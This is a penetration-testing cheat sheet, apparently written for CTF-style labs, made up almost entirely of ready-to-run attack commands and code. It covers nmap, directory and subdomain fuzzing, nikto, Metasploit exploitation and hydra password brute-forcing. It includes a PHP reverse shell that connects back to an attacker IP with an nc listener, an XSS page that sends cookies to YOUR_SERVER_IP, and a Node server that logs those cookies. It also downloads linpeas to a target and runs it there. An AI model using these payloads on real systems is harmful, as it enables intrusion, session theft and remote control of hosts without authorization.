## Network scan with`nmap`:
```bash
nmap -v -sV -O -A --top-ports 1000 -oN nmap_output.txt example.com
```

## Directory enumeration with `dirb`:
```bash
dirb http://example.com /usr/share/wordlists/dirb/common.txt -o dirb_output.txt
```

## Subdomains enumeration with `ffuf`:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com -H "Host: FUZZ.example.com" -mc 200 -fs 15949 -o ffuf_output.json -of json
```

## Web app scan with `nikto`:
```bash
nikto -h example.com -p 80 -o nikto_output.txt
```

## Exploit with `metasploit`:
```bash
msfconsole

show

search <exploit_name>

use exploit/linux/http/exploit_name

set RHOSTS example.com
set RPORT 80

show payloads
set payload <payload_name>

exploit
```

## PHP reverse shell
### Listener:
```bash
nc -lvnp 4444
```
### Reverse shell:
```php
<?php
$ip = 'x.x.x.x'; // change this to your IP address
$port = 4444; // change this to your listening port
$socket = fsockopen($ip, $port);
if ($socket) {
    $shell = 'uname -a; w; id; /bin/sh -i';
    fwrite($socket, $shell);
    while (!feof($socket)) {
        $command = fgets($socket);
        $output = '';
        if ($command) {
            $output = shell_exec($command);
            fwrite($socket, $output);
        }
    }
    fclose($socket);
}
?>
```

## XSS/CSRF attack
### Serve:
```bash
mkdir xss
cd xss
nano index.html
sudo python3 -m http.server 4444
```
### index.html:
```bash
<html>
  <head>
    <title>CTF</title>
    <script>
      // Collect additional information
      var cookies = document.cookie;
      var userAgent = navigator.userAgent;
      var platform = navigator.platform;
      var language = navigator.language || navigator.userLanguage;
      var screenSize = screen.width + 'x' + screen.height;
      
      // Encode the data to ensure it's safely transmitted
      var data = encodeURIComponent(
        'cookies=' + cookies +
        '&userAgent=' + userAgent +
        '&platform=' + platform +
        '&language=' + language +
        '&screenSize=' + screenSize
      );
      
      // Send the data to your server
      var i = new Image();
      i.src = "http://YOUR_SERVER_IP:5555/?" + data;
    </script>
  </head>
  <body>
    <h1>Hi Admin!</h1>
  </body>
</html>
```
### Listen:
```bash
mkdir cookies
cd cookies
nano index.js
node index.js
```
### index.js:
```bash
const http = require('http');
const url = require('url');

http.createServer((req, res) => {
  const queryObject = url.parse(req.url, true).query;
  console.log('Cookies: ', queryObject.cookie);
  res.end('Logged');
}).listen(5555);
```

## Login brute-force with `hydra`
### Syntax 1:
```bash
sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt http-post-form://example.com/login"&username=^USER^&password=^PASS^:F=Bad"
```
### Syntax 2:
```bash
sudo hydra -v -V -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt example.com http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
```

## Send directory with `netcat`
### Sender:
```bash
tar -czf directory.tar.gz ./directory
cat directory.tar.gz | nc example.com 1234
```
### Receiver:
```bash
nc -l -p 1234 > directory.tar.gz
```

## Archive
### Compress:
```bash
tar -czvf archive.tar.gz /path/to/directory_or_file
```
### Extract:
```bash
tar -xzvf archive.tar.gz -C /path/to/extract
```

## Privilege escalation with `linpeas`
### Serve:
```bash
mkdir linpeas
cd linpeas
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sudo python3 -m http.server 8080
```
### Download and execute:
```bash
cd /tmp
wget x.x.x.x:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > ./output.txt
less -r ./output.txt
```
